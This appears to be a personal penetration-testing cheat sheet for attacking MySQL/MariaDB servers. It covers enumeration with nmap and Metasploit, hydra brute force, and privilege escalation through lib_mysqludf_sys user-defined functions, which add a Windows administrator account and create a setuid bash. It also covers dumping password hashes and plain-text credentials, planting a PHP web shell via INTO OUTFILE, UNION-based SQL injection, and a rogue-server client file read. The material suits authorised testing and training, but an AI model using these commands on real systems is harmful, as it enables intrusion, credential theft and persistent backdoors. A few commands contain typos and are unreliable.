---
Ports: 3306
Description: MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).
---

>[!info]
> bla bla


# Basic Usage

## Connect

Local:

```bash
mysql -u root    # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

Remote:

```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```


---

# Enumeration

- [NSE (Nmap Scripting Engine)](../Tools/nmap.md#NSE%20(Nmap%20Scripting%20Engine))
- [msfconsole (auxiliary modules)](../Tools/msfconsole.md#Auxiliary%20Modules)

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

---

# Exploitation

## Brute Force

- [hydra](../Tools/hydra.md#MySQL%20Brute-Force)
- [msfconsole](../Tools/msfconsole.md)

```bash
hydra -L usernames.txt -P pass.txt <IP> mysql
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
```

## [SQL Injection](../Web%20&%20Network%20Hacking/SQL%20Injection.md)

---

# Post Exploitation

## Mysql User

It will be very interesting if mysql is running as **root**:

```bash
# MySQL
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"

# Mariadb
cat /etc/mysql/mariadb.cnf | grep -v "#" | grep "user"
cat /etc/mysql/* | grep -v '#' | grep user
cat /etc/mysql/mariadb.conf.d/* | grep -v '#' | grep user
```

## Privilege escalation

How to (**MySQL**):

- Current Level of access
    - mysql>`select user();`
    - mysql>`select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';`
- Access passwords
    - mysql> `use mysql`
    - mysql> `select user,password from user;`
- Create a new user and grant him privileges
    - mysql>`create user test identified by 'test';`
    - mysql> `grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;`
- Break into a shell
    - mysql> `\! cat /etc/passwd`
    - mysql> `\! bash`

For **Mariadb** follow the note above in a similar way

### Privilege escalation via library (MySQL)

You can find **compiled versions** of this **libraries** in [sqlmap](../Tools/sqlmap.md): `locate lib_mysqludf_sys.so` and `locate lib_mysqludf_sys.dll`.
Instead of `locate` you can also use `whereis` to search for this libraries inside the host.

**Linux**:

```sql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/tmp/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('id > /tmp/out.txt');
```

**Windows**:

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

### Privilege escalation via library (Mariadb)

Generate the shellcode using [xxd](../Dev,%20scripting%20&%20OS/Linux%20command%20cheatsheet.md#xxd)
```bash
┌──(kali㉿kali)-[~/…/ntwk/admin.local/10.3.3.42/exploit]
└─$ whereis lib_mysqludf_sys
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so

┌──(kali㉿kali)-[~/…/ntwk/admin.local/10.3.3.42/exploit]
└─$ xxd -p /usr/lib/lib_mysqludf_sys.so | tr -d '\n' > udf.hex

┌──(kali㉿kali)-[~/…/ntwk/admin.local/10.3.3.42/exploit]
└─$ cat udf.hex | xclip -sel c
```

```sql
set @shell = 0x<shellcode>;
select @@plugin_dir
select binary @shell into dumpfile <plugin_dir directory>;
create function sys_exec returns int soname <udf_filename>;
select * from mysql.func where name='sys_exec';
select sys_exec('cp /bin/bash /tmp/; chown root:root /tmp/bash; chmod +s /tmp/bash')
```

### Extracting MySQL credentials from the database

```sql
SELECT User,Host,Password FROM mysql.user;
SELECT User,Host,authentication_string FROM mysql.user;
```

```bash
mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"
```

### Extracting MySQL credentials from files

Inside `/etc/mysql/debian.cnf` you can find the plain-text password of the user **debian-sys-maint**

```bash
cat /etc/mysql/debian.cnf
```

Inside the file: `/var/lib/mysql/mysql/user.MYD` you can find all the hashes of the MySQL users (the ones that you can extract from `mysql.user` inside the database).
You can extract them doing:

```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

---

# Misc

## Basic & interesting MySQL commands

```sql
show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

show variables like 'plugin_dir';

#Try to execute code
select do_system('id');
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```sql
mysql -u username -p < manycommands.sql # File with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

## Write any binary data

```sql
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```

## MySQL arbitrary read file by client

Actually, when you try to **load data local into a table** the **content of a file** the MySQL or MariaDB server asks the **client to read it** and send the content. **Then, if you can tamper a mysql client to connect to your own MyQSL server, you can read arbitrary files.** Please notice that this is the behaviour using:

```sql
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

(Notice the "local" word) Because without the "local" you can get:

```sql
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

**Initial PoC:** [https://github.com/allyshka/Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)

In this paper you can see a complete description of the attack and even how to extend it to RCE: [https://paper.seebug.org/1113/](https://paper.seebug.org/1113/)

**Here you can find an overview of the attack:** [http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

## Default config files

```
# Windows
config.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/

# Unix
my.cnf
/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf
/etc/my.cnf

## Command History
~/.mysql.history

# Log
connections.log
update.log
common.log
```

## Enable database logging (for researching SQL Injection vuln.)

```
$ sudo nano /etc/mysql/my.cnf
[mysqld]
...
general_log_file = /var/log/mysql/mysql.log
general_log = 1
...

$ sudo systemctl restart mysql
$ sudo tail –f /var/log/mysql/mysql.log
```